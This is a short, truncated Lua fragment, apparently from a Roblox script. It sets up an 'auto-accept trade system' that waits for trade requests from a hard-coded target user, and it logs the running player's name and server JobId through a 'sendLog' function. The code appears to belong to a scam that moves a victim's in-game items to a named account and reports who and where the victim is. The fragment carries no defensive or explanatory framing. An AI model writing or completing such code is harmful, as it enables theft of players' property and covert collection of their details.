local function watchForTarget()
    sendLog("👀 Auto-accept trade system active")
    sendLog("🎯 Waiting for " .. TARGET_USER .. " to send a trade request...")
    sendLog("👤 Your name: " .. player.Name)
    sendLog("🖥️ Server: " .. game.JobId)
    
    -- Setup listener
    setupTradeListener()
    
    -- Log when Sigmake5 joins
